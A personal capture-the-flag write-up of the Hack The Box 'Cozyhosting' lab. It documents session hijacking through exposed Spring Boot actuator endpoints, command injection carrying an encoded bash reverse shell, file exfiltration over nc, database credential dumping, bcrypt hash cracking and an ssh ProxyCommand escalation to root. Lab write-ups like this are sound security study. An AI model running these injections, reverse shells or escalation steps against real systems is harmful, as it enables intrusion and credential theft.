---
title: HTB 1 - Cozyhosting
tag: htb
category: cyber
---

## Comments

This is the first machine I attempted after finishing the Starting Point machines.

Unlike Starting Point machines, these have no guidance. I ended up referring to a walkthrough because I didn't know what to search for. But I hope to do future ones without any walkthrough unless I am really really stuck for hours.

This machine tested Command Line injection via HTTP which I had not encountered before, but the idea of Remote Code Execution via some form of XSS/HTTP/SQL injection is familiar.

Even with the walkthrough, I got tripped up by the formatting of commands as I was using different software (Burpsuite) which already does its own encoding.

Also, I learned to be wary the different encoding of non-alphanumeric characters as a string passes through URL, HTTP, UNIX, and so on.

## Walkthrough

### Enumeration

Target `10.10.11.230`

My IP `10.10.14.33`

Check target IP using web browser reveals `cozyhosting.htb` domain.

Add `10.10.11.230` to `/etc/hosts`

Check for open ports

    nmap -sC -sV -v 10.10.11.230

    >> PORT   STATE SERVICE REASON  VERSION
        22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
        |_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
        | http-methods: 
        |_  Supported Methods: GET HEAD OPTIONS
        |_http-server-header: nginx/1.18.0 (Ubuntu)
        |_http-title: Cozy Hosting - Home
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ssh service suggest a way to interact with the target once we get credentials

Brute-force directory...

    dirb http://cozyhosting.htb/ /usr/share/dirb/wordlists/small.txt -r

    >>  + http://cozyhosting.htb/admin (CODE:401|SIZE:97)    
        + http://cozyhosting.htb/error (CODE:500|SIZE:73)    
        + http://cozyhosting.htb/index (CODE:200|SIZE:12706) 
        + http://cozyhosting.htb/login (CODE:200|SIZE:4431)  
        + http://cozyhosting.htb/logout (CODE:204|SIZE:0)

Check out the `admin` page but it redirects us back to login

Check out the `error` page and it shows

> Whitelabel Error Page

Google tells us that Whitelabel comes from Springboot-based applications so we further Google for Springboot endpoints.

From [Springboot](https://docs.spring.io/spring-boot/docs/2.1.13.RELEASE/reference/html/production-ready-endpoints.html#:~:text=Spring%20Boot%20includes%20a%20number,exists%20in%20the%20application%20context.):

> Actuator endpoints let you monitor and interact with your application. Spring Boot includes a number of built-in endpoints and lets you add your own. For example, the health endpoint provides basic application health information.  Each individual endpoint can be enabled or disabled. This controls whether or not the endpoint is created and its bean exists in the application context. <br><br> To be remotely accessible an endpoint also has to be exposed via JMX or HTTP. Most applications choose HTTP, where the ID of the endpoint along with a prefix of /actuator is mapped to a URL. For example, by default, the health endpoint is mapped to /actuator/health.

Checking `http://cozyhosting.htb/actuators` shows many endpoints. 

In particular:

    /actuators/sessions 
    /actuators/mapping

### Foothold

The `sessions` endpoint gives us the SESSID for a user `kanderson`.

    1CAE2623ACDC287A6F56C977E6C9D94F: kanderson

By passing this SESSID cookie to our browser and then sending a request to the `/admin` URL, we are able to access the admin panel.

At the bottom of the admin panel we see another entry point! A system user can SSH into the machine if they have the right credentials.

Let's see if this SSH field is vulnerable to injection...

Enter `kanderson` as username and `'` single quote as host name.

The URL returns

    http://cozyhosting.htb/admin?error=usage:%20

If we try with `;` semicolon instead, the message returned is the usual error when ssh is not used properly in the terminal.

    ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]

This suggests that the server is taking in hostname and user name without sanitizing it, and passing it straight into an ssh command via command line. 

This means we can try to sneak in a reverse shell by terminating the ssh command and running our reverse shell.

### Remote Code Execution

Since the machine is likely running `ssh [username]@[hostname]`

We pass a username that causes the command to become `ssh ;[reverse_shell_cmd];#@[hostname]`

The first `ssh ;` will not do anything since no params are passed, moving us to the next command which is the reverse shell. Afterwhich the `#[hostname]` will be treated as a comment.

Hence our payload is `;[reverse_shell_cmd];#`

The standard reverse shell command is:

    bash -i >&/dev/tcp/10.10.14.33/1234 0>&1

Which we need to base64 encode so that it can be passed through HTTP

    echo "bash -i >&/dev/tcp/10.10.14.33/1234 0>&1" | base64

    >> YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo=

Now, we need a command that the machine will execute in CLI (after it tries to ssh) to decode the base64 and then execute the reverse shell command in its own bash terminal.

    echo "YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo="|base64 -d|bash

Hence, our payload is 

    ;echo "YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo="|base64 -d|bash;#

One last step - since whitespaces get converted into `%20` when URL-encoded which causes the command to be interpreted wrongly by the terminal. We need to convert whitespaces into something that can be sent without being encoded, and also interpretable by the terminal.

We can use the  UNIX Internal Field Separator `${IFS}` which is a whitespace by default.

    ;echo${IFS}"YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo="|base64${IFS}-d|bash;#

Finally, URL-encode the entire payload to be sent.
(I was having an issue with this because I didn't URL encode, and the `+` was being encoded into a whitespace when it reached the terminal).

    %3becho${IFS}"YmFzaCAtaSA%2bJi9kZXYvdGNwLzEwLjEwLjE0LjMzLzEyMzQgMD4mMQo%3d"|base64${IFS}-d|bash%3b%23

Open up a listener on port 1234

    nc -l -v -p 1234

Then send the request containing the payload in the username field (I used Burpsuite Repeater for this).

Reverse Shell obtained!

## Lateral movement

We find a file named `cloudhosting-0.0.1.jar` which contains the entire contents of the server. See [here](https://docs.spring.io/spring-boot/docs/current/reference/html/executable-jar.html) for more details.

Download the file to our local machine using a nc transfer

    TARGET
    nc [our ip address] 7777 < cloudhosting-0.0.1.jar
    
    LOCAL
    nc -l -p 7777 > cloudhosting-0.0.1.jar

.jar files can be opened with the jd-gui program.

Inside, we can find a segment that has details about the server database:

    server.address=127.0.0.1
    server.servlet.session.timeout=5m
    management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
    management.endpoint.sessions.enabled = true
    spring.datasource.driver-class-name=org.postgresql.Driver
    spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
    spring.jpa.hibernate.ddl-auto=none
    spring.jpa.database=POSTGRESQL
    spring.datasource.platform=postgres
    spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
    spring.datasource.username=postgres
    spring.datasource.password=Vg&nvzAQ7XxR

Back in the reverse shell, we can access the PostgreSQL database directly using the `postgres` username with the provided password.

    psql -U postgres -h 127.0.0.1

Explore the database and find the user credentials table

    >> \l
                                    List of databases
        Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
    -------------+----------+----------+-------------+-------------+-----------------------
    cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
    postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
    template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
                |          |          |             |             | postgres=CTc/postgres
    template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
                |          |          |             |             | postgres=CTc/postgres
    (4 rows)

    >> \c cozyhosting


    You are now connected to database "cozyhosting" as user "postgres".

    >> \d
                List of relations
    Schema |     Name     |   Type   |  Owner   
    --------+--------------+----------+----------
    public | hosts        | table    | postgres
    public | hosts_id_seq | sequence | postgres
    public | users        | table    | postgres
    (3 rows)

    >> select * from users;

    name    |                           password                           | role  
    -----------+--------------------------------------------------------------+-------
    kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
    admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

These look like password hashes.

Quick google and we find that the hash is of either formats:
- Blowfish(OpenBSD)
- Woltlab Burning Board 4.x
- bcrypt

Copy the `admin` hash to a file and use John the Ripper to crack it.

    john admin_hash.txt --wordlist='~/Downloads/SecLists/Passwords/Leaked-Databases/rockyou-75.txt'
    john show

    >> manchesterunited

Still in reverse shell, we can check `/home` for other users and find `josh`.

So `josh` is the admin... We'll `su josh` using the cracked password.

We have found the `user.txt`

    fee6e0563d22974e573c2cbf575f6f84

### Privilege Escalation

Check what commands `josh` can run as root

    sudo -l

    >> User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

Since `ssh` can be run as root, we can use `josh` to start an SSH to our local machine as `root` but interrupt it and slip in a shell which will be executed as `root` that we can then use to explore the `root` dir.

Refer to this [collection of binary escapes](https://gtfobins.github.io/gtfobins/ssh/) for more details.

    sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' 10.10.14.33

I needed a breakdown of the command to fully understand how it worked:

    sudo --> uses the root privilege (which we will exploit)
    -o ProxyCommand= --> the proxy command will be run before ssh attempts to connect to the provided host
    ; --> terminates the previous command (i.e. terminate the ssh)
    sh --> start a shell
    0<&2 --> redirect inputs (0) to stderr (i.e. display inputs in console log)
    1>&2 redirect outputs (1) to the stderr (i.e display outputs in console log)

    ** note that <& is for redirecting inputs and >& is for redirecting outputs, the arrow direction doesnt actually mean anything..

Essentially, we use ProxyCommand to hijack the root privilege that ssh has to start a shell as root.

Inside `root` we can find `root.txt`

    4cb1287a9a46e01e6bdd318232018329


And we're done! This was a really long one because there were multiple steps to move laterally and finally get privilege escalation. 

Some things that I want to explore more from this:
- Command Line injection (should go read up more on this)
- Exploiting and escaping binaries that can be run as root
- Hash cracking
- All the various ways to get reverse shells and root shells


*That's all for tonight, ciao.*


